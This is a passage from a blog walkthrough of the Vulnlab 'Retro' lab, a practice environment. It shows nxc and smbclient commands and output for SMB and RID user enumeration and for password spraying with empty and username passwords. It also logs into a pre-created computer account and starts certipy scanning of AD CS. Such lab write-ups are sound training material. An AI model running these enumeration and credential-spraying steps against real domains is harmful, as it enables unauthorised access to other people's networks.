<!DOCTYPE html>
<html lang="en-us" data-theme="light">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>
  Vulnlab : Retro Easy - l0key blog
</title>



<meta name="description" content="This easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.
Reconnaissance
network scan: 
PORT …" />



<meta
  property="og:title"
  content="Vulnlab : Retro Easy"
/>
<meta
  property="og:description"
  content="This easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.
Reconnaissance
network scan: 
PORT …"
/>
<meta
  property="og:type"
  content="article"
/>
<meta property="og:url" content="http://localhost:1313/posts/retro/" />
<meta property="og:site_name" content="l0key blog" />


<meta name="twitter:card" content="summary_large_image" />
<meta
  name="twitter:title"
  content="Vulnlab : Retro Easy"
/>
<meta
  name="twitter:description"
  content="This easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.
Reconnaissance
network scan: 
PORT …"
/>


<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@400;500&display=swap"
  rel="stylesheet"
/>


<link
  rel="stylesheet"
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
/>


<link rel="stylesheet" href="http://localhost:1313/css/style.css">
<link rel="stylesheet" href="/css/custom.css">
<script src="/js/image-zoom.js"></script>



</head>
<body>
    
    <div class="reading-progress"></div>
    

    

    <main>
        

<div class="post-overlay active">
    <div class="post-overlay-backdrop"></div>
    <div class="post-overlay-content" style="position: relative; min-height: 100vh; padding: 0; transform: translateY(0);">
        <div class="post-overlay-header">
            <div class="post-overlay-title">
                <a href="/" class="overlay-site-title">l0key blog</a>
            </div>
            <button class="post-overlay-close" aria-label="Close post" onclick="window.location.href='/'">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="post-layout">
        <article class="post-content">
            <header class="post-header">
                <div class="post-meta">
                    <span class="post-date">2025.10.16</span>
                    <div class="reading-time-post">
                        <span class="coffee-cups">
                            
                            
                            
                            
                                
                            
                            
                                
                            
                                
                            
                                
                            
                                
                            
                                
                            
                            ☕☕☕☕☕
                        </span>
                        <span>10 min read</span>
                    </div>
                </div>
                <h1 class="post-title">Vulnlab : Retro Easy</h1>
                

                
                <div class="post-tags-header">
                    
                    <a href="http://localhost:1313/tags/misc" class="post-tag">misc</a>
                    
                </div>
                
            </header>
            <div class="post-body">
                <p>This easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>network scan: 
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-10-14 17:57:37Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: retro.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: retro.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: retro.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: retro.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>We can see from the nmap scan the use of LDAPS, which could indicate the use of AD CS. This service allows the creation of a PKI to issue certificates.</p>
<h3 id="smb-enumeration">SMB enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:12:32 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.98.67 -u &#39;&#39; -p &#39;&#39; --shares</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\:</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:13:13 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.98.67 -u &#39;test&#39; -p &#39;&#39; --shares</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\t</span>est: <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               NETLOGON                        Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               Notes
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               SYSVOL                          Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               Trainees        READ
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:17:35 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># smbclient //10.10.98.67/Trainees -U &#34;dhgdgej&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\d</span>hgdgej<span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jul <span style="color:#ae81ff">23</span> 23:58:43 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>  ..                                DHS        <span style="color:#ae81ff">0</span>  Wed Jul <span style="color:#ae81ff">26</span> 11:54:14 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>  Important.txt                       A      <span style="color:#ae81ff">288</span>  Mon Jul <span style="color:#ae81ff">24</span> 00:00:13 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">6261499</span> blocks of size 4096. <span style="color:#ae81ff">2892582</span> blocks available
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get Important.txt
</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\I</span>mportant.txt of size <span style="color:#ae81ff">288</span> as Important.txt <span style="color:#f92672">(</span>2.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.6 KiloBytes/sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:17:45 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># cat Important.txt</span>
</span></span><span style="display:flex;"><span>Dear Trainees,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I know that some of you seemed to struggle with remembering strong and unique passwords.
</span></span><span style="display:flex;"><span>So we decided to bundle every one of you up into one account.
</span></span><span style="display:flex;"><span>Stop bothering us. Please. We have other stuff to <span style="color:#66d9ef">do</span> than resetting your password every day.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Regards
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The Admins
</span></span></code></pre></div><p>We can see the existence of a trainee account for multiple users, with a unique password.</p>
<h3 id="user-enumeration">User enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enum users: nxc smb 10.10.108.91 -u <span style="color:#e6db74">&#39;kfhfkhfkgh&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute --log users.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>create user file: cat users.txt | awk <span style="color:#e6db74">&#39;{print $13}&#39;</span> | cut -d <span style="color:#e6db74">&#39;\&#39;</span> -f <span style="color:#ae81ff">2</span> | sed -n 29,33p &gt; users.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:18:50 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># cat users.txt</span>
</span></span><span style="display:flex;"><span>trainee
</span></span><span style="display:flex;"><span>BANKING$
</span></span><span style="display:flex;"><span>jburley
</span></span><span style="display:flex;"><span>HelpDesk
</span></span><span style="display:flex;"><span>tblack
</span></span></code></pre></div><p>Now we have a list of users. Searching in LDAP, I didn&rsquo;t find any trivial passwords. So we&rsquo;ll check if any user might be using an empty password or a password identical to their username.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:19:27 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.98.67 -u users.txt -p &#39;&#39; --no-bruteforce --continue-on-success</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\t</span>rainee: STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\B</span>ANKING$: STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\j</span>burley: STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\H</span>elpDesk: <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\t</span>black: STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:20:26 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.98.67 -u users.txt -p users.txt --no-bruteforce --continue-on-success</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\t</span>rainee:trainee
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\B</span>ANKING$:BANKING$ STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\j</span>burley:jburley STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\H</span>elpDesk:HelpDesk <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\t</span>black:tblack STATUS_LOGON_FAILURE
</span></span></code></pre></div><p>I tried, just in case, to see if we could get an interactive session with the credentials we found.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:31:30 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># evil-winrm -i 10.10.98.67 -u &#39;trainee&#39; -p &#39;trainee&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Error: Exiting with code <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>It seems not, so I&rsquo;ll check if this user unlocks more permissions on SMB shares.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:32:36 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.98.67 -u &#39;trainee&#39; -p &#39;trainee&#39; --shares</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\t</span>rainee:trainee
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               Notes           READ
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               SYSVOL          READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.98.67     <span style="color:#ae81ff">445</span>    DC               Trainees        READ
</span></span></code></pre></div><p>We have read access to the Notes share.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:34:14 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># smbclient //10.10.98.67/Notes -U &#34;trainee&#34;</span>
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\t</span>rainee<span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">24</span> 00:03:16 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>  ..                                DHS        <span style="color:#ae81ff">0</span>  Wed Jul <span style="color:#ae81ff">26</span> 11:54:14 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>  ToDo.txt                            A      <span style="color:#ae81ff">248</span>  Mon Jul <span style="color:#ae81ff">24</span> 00:05:56 <span style="color:#ae81ff">2023</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">6261499</span> blocks of size 4096. <span style="color:#ae81ff">2891768</span> blocks available
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get ToDo.txt
</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\T</span>oDo.txt of size <span style="color:#ae81ff">248</span> as ToDo.txt <span style="color:#f92672">(</span>1.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.9 KiloBytes/sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:34:35 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># cat ToDo.txt</span>
</span></span><span style="display:flex;"><span>Thomas,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>after convincing the finance department to get rid of their ancient banking software
</span></span><span style="display:flex;"><span>it is finally time to clean up the mess they made. We should start with the pre created
</span></span><span style="display:flex;"><span>computer account. That one is older than me.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Best
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>James
</span></span></code></pre></div><p>We can see that the company uses pre-created computers. If we refer to this <a href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">blog post</a>, if we find a computer with this attribute, its password will be the same as its name in lowercase.</p>
<p>In the user list we created earlier, we can see an account with a computer name (BANKING$), let&rsquo;s check if this is indeed the case.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:51:55 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc ldap 10.10.98.67 -u &#39;trainee&#39; -p &#39;trainee&#39; --query &#34;(ObjectClass=user)&#34; &#34;*&#34; | grep Computers</span>
</span></span><span style="display:flex;"><span>LDAP                     10.10.98.67     <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Response <span style="color:#66d9ef">for</span> object: CN<span style="color:#f92672">=</span>banking,CN<span style="color:#f92672">=</span>Computers,DC<span style="color:#f92672">=</span>retro,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>LDAP                     10.10.98.67     <span style="color:#ae81ff">389</span>    DC               distinguishedName    CN<span style="color:#f92672">=</span>banking,CN<span style="color:#f92672">=</span>Computers,DC<span style="color:#f92672">=</span>retro,DC<span style="color:#f92672">=</span>vl
</span></span></code></pre></div><p>Ok, now we potentially have a computer account. Let&rsquo;s verify this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 16, <span style="color:#ae81ff">2025</span> - 21:38:13 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.98.67 -u &#39;banking$&#39; -p &#39;banking&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.10.121.126   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.121.126   <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\b</span>anking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
</span></span></code></pre></div><p>Now, I think we should explore the possibility of a vulnerability with AD CS, such as a misconfiguration of a certificate template.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:49:36 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc ldap 10.10.98.67 -u &#39;trainee&#39; -p &#39;trainee&#39; -M adcs</span>
</span></span><span style="display:flex;"><span>LDAP        10.10.98.67     <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro.vl<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>LDAP        10.10.98.67     <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro.vl<span style="color:#ae81ff">\t</span>rainee:trainee
</span></span><span style="display:flex;"><span>ADCS        10.10.98.67     <span style="color:#ae81ff">389</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting LDAP search with search filter <span style="color:#e6db74">&#39;(objectClass=pKIEnrollmentService)&#39;</span>
</span></span><span style="display:flex;"><span>ADCS        10.10.98.67     <span style="color:#ae81ff">389</span>    DC               Found PKI Enrollment Server: DC.retro.vl
</span></span><span style="display:flex;"><span>ADCS        10.10.98.67     <span style="color:#ae81ff">389</span>    DC               Found CN: retro-DC-CA
</span></span></code></pre></div><p>Ok, with nxc&rsquo;s adcs module we can indeed see that the DC also acts as an enrollment server.
We will now look for vulnerable templates with certipy.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 14, <span style="color:#ae81ff">2025</span> - 20:54:05 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># certipy find -u &#39;trainee@retro.vl&#39; -p &#39;trainee&#39; -dc-ip &#39;10.10.98.67&#39; -vulnerable -stdout</span>
